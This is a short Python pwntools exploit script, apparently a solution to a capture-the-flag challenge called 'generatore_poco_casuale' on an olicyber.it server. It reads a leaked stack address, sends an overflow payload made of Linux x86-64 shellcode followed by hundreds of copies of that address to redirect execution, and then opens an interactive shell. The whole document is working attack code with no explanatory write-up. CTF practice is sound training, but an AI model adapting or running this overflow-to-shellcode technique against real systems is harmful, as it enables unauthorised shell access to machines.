#!/usr/bin/env python3
from pwn import *

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch='x86_64')

if args.REMOTE:
    p = remote("gpc.challs.olicyber.it", 10104)
else:
    p = gdb.debug("./generatore_poco_casuale", """
        b *randomGenerator+149
        continue
    """)

p.recvuntil(b': ')
leak = int(p.recvline().strip().decode()) + 6
print(hex(leak))

leaks = b''
for i in range(800):
    leaks += p64(leak)

p.recvuntil(b'(s/n)')
p.sendline(b'a' + b'\x00' * 7 +  SHELLCODE + b'a' * 8 + leaks)
p.interactive()
